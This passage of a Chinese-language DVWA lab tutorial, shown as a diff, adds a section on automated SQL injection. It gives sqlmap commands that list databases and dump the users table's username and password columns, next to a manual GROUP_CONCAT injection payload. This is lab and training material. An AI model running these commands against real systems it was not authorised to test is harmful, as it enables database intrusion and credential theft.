@@ -241,3 +241,27 @@ impossible 难度下会 校验图片内容，重命名图片。
     SELECT+GROUP_CONCAT(user,":",password+SEPARATOR+0x3c62723e)+FROM+dvwa.users
 
 ![img.png](img/img27.png)
+---
+### sqlmap自动化注入
+
+brup suit 保存数据报文 txt。
+
+自动化注入。
+
+    python sqlmap.py -r 路径 --batch 
+
+![img.png](img/img28.png)
+
+id 参数存在注入 GET 请求
+
+注入类型 布尔类型，报错，延时，联合注入。
+
+    python sqlmap.py -r 路径 --batch --dbs
+
+    python sqlmap.py -r 路径 --batch -D dvwa -T user --column
+
+    python sqlmap.py -r 路径 --batch -D dvwa -T user -C "users,password" --dump
+
+![img.png](img/img29.png)
+
+![img.png](img/img30.png)
